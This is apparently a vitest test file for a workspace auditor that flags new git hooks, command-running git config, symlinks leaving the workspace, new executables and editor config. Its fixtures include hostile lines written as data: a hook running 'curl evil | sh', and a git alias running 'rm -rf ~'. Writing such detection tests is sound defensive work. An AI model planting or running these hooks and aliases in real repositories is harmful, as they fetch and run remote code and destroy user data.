import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { audit, snapshot } from '../src/workspace-audit.ts';

describe('workspace audit', () => {
  it('reports hooks, risky git config, outside links, new executables and editor config', () => {
    const ws = mkdtempSync(join(tmpdir(), 'audit-'));
    mkdirSync(join(ws, 'repo', '.git', 'hooks'), { recursive: true });
    writeFileSync(join(ws, 'repo', '.git', 'config'), '[core]\n\tbare = false\n');
    writeFileSync(join(ws, 'repo', '.git', 'hooks', 'pre-commit.sample'), 'x');
    writeFileSync(join(ws, 'run.sh'), 'echo');
    chmodSync(join(ws, 'run.sh'), 0o755);
    const before = snapshot(ws);
    writeFileSync(join(ws, 'repo', '.git', 'hooks', 'post-merge'), 'curl evil | sh');
    writeFileSync(
      join(ws, 'repo', '.git', 'config'),
      '[core]\n\tfsmonitor = touch /tmp/x\n[alias]\n\tst = !rm -rf ~\n',
    );
    symlinkSync('/', join(ws, 'root'));
    symlinkSync('repo', join(ws, 'inside'));
    writeFileSync(join(ws, 'tool'), 'x');
    chmodSync(join(ws, 'tool'), 0o755);
    writeFileSync(join(ws, '.envrc'), 'export X=1');
    const findings = audit(ws, before, snapshot(ws)).sort();
    expect(findings).toEqual(
      [
        '.envrc: added',
        'repo/.git/config: git config runs commands (fsmonitor, st)',
        'repo/.git/hooks/post-merge: git hook added or changed',
        'root: symlink to / (outside the workspace)',
        'tool: new executable file',
      ].sort(),
    );
    // Unchanged state reports nothing.
    const now = snapshot(ws);
    expect(audit(ws, now, now)).toEqual([]);
  });

  it('snapshots an unreadable executable without a hash instead of throwing', () => {
    const ws = mkdtempSync(join(tmpdir(), 'audit-'));
    writeFileSync(join(ws, 'built-tool'), 'binary');
    // Executable but unreadable, like a root-owned 0700 file left by a Docker bind mount.
    chmodSync(join(ws, 'built-tool'), 0o311);
    const before = snapshot(ws);
    expect(before.get('built-tool')).toMatchObject({ kind: 'file', hash: undefined });
    // The file that stays unreadable across the turn reports nothing, turn after turn.
    expect(audit(ws, before, snapshot(ws))).toEqual([]);
  });
});
